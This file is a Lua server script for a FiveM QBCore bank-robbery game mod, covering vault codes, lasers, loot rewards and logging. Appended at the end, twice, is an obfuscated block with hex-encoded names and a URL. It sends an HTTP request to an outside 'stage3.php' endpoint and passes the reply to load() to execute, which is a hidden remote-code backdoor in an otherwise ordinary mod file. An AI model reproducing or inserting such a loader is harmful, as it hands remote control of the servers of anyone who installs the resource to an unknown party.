local vaultCode = math.random(1000, 9999)
local flags = 0

CreateThread(function()
    print("^3[qb-bankrobbery] ^5Access Code: "..vaultCode.."^7")
end)

QBCore.Functions.CreateUseableItem("explosive", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        TriggerClientEvent("explosive:UseExplosive", source)
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetPowerPlant', function(state)
    Config.Banks['Vault'].powerplantHit = state
    TriggerClientEvent('qb-bankrobbery:client:SetPowerPLant', -1, state)
    if debug then
        print('^3[qb-bankrobbery] ^5Power Station Hit '..tostring(state)..'^7')
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetLasers', function(state)
    Config.Banks['Vault'].lasersActive = state
    TriggerClientEvent('qb-bankrobbery:client:SetLasers',  -1, state)
    if debug then
        print('^3[qb-bankrobbery] ^5Set Laser: '..tostring(state)..'^7')
    end
end)

RegisterNetEvent('qb-bankrobbery:server:HitByLaser', function()
    Config.Banks['Vault'].lockdown = true
    TriggerClientEvent('qb-bankrobbery:client:VaultLockDown', -1)
end)

RegisterNetEvent('qb-bankrobbery:server:SetGoldHacked', function()
    -- Start Lasers
    if not Config.Banks['Vault'].powerplantHit then
        TriggerEvent('qb-bankrobbery:server:SetLasers', true)
    end
    Config.Banks['Vault'].goldhacked = true
    TriggerEvent('qb-doorlock:server:updateState', Config.Banks['Vault'].laptopDoor, false)
    TriggerClientEvent('qb-bankrobbery:client:SetGoldHacked',  -1)
    if debug then
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(source)..' (id: '..source..') Hacked Gold Laptop Vault^7') 
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetStackTaken', function(index, state)
    Config.Banks['Vault'].stacks[index].taken = state
    TriggerClientEvent('qb-bankrobbery:client:SetStackTaken', -1, index, state)
end)

RegisterNetEvent('qb-bankrobbery:server:StackReward', function(type)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if type == 'money' then
        local info = {worth = math.random(12000, 14000)} -- money bag worth
        local receiveAmount = math.random(4, 5)
        Player.Functions.AddItem('markedbills', receiveAmount, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], 'add')
        TriggerClientEvent('QBCore:Notify', src, 'You got ' .. receiveAmount .. ' bags of inked money...')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: Vault', 'black', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..receiveAmount..'x moneybags: $'..(receiveAmount*info.worth)..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..' (citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received: '..receiveAmount..' moneybags :'..(receiveAmount*info.worth)..'^7')
        end
    elseif type == 'gold' then
        local itemAmount = 10
        Player.Functions.AddItem('goldbar', itemAmount)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: Vault', 'black', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..' (citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received: '..itemAmount.. 'x goldbar^7') 
        end
    end
end)

RegisterNetEvent('qb-bankrobbery:server:PrintCodes', function()
    local Player = QBCore.Functions.GetPlayer(source)
    info = {codes = vaultCode}
    Player.Functions.AddItem("lowervaultcodes", 1, false, info)
    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items["lowervaultcodes"], "add")
    TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Lower Vault Codes", "black", "**".. GetPlayerName(source) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..source.."*) printed lower vault code..")
end)

RegisterNetEvent('qb-bankrobbery:server:AttemptCode', function(input)
    if input == vaultCode then
        Config.Banks['Vault'].code = true
        TriggerClientEvent('qb-bankrobbery:client:CorrectCode', -1)
    else
        flags = flags + 1
        if flags >= 3 then
            Config.Banks['Vault'].lockdown = true
            TriggerClientEvent('qb-bankrobbery:client:VaultLockDown', -1)
        end
        TriggerClientEvent('QBCore:Notify', source, "Incorrect! ("..flags.."/3)", "error", 2500)
    end
end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)